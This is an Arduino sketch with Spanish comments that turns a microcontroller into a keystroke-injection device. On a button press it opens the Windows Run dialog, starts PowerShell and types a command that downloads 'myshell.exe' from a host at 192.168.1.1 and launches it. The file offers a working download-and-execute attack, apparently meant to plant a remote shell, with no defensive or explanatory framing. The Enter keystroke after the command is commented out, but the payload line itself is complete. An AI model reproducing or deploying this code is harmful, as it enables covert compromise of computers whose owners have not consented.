#include<Keyboard.h>

const int buttonPin = 2;          // Pin del boton
int previousButtonState = HIGH;   // Estado del boton
int counter = 0;                  // Contador del boton por cada pulsp
int check = 0;

String direccion = "192.168.1.1";

void typeKey(uint8_t key)
{
  Keyboard.press(key);
  delay(50);
  Keyboard.release(key);
}

void setup()
{
  pinMode(buttonPin, INPUT);
  Keyboard.begin();  
}

void loop()
{
  int buttonState = digitalRead(buttonPin);
  
  if ((buttonState != previousButtonState) && (buttonState == HIGH))
  {
    delay(1000);

    Keyboard.press(KEY_LEFT_GUI);
    Keyboard.press('r');
    Keyboard.releaseAll();
  
    delay(1000);
    Keyboard.print("powershell");
    typeKey(KEY_RETURN);
  
    delay(1000);
  
    Keyboard.print("cd ~/");
    typeKey(KEY_RETURN);
    
    delay(1000);
    Keyboard.print("(new-object System.Net.WebClient).DownloadFile('http://" + direccion + "/myshell.exe', 'myshell.exe'); Start-Process \"myshell.exe\" ");
    //typeKey(KEY_RETURN);
  }
  previousButtonState = buttonState;
}
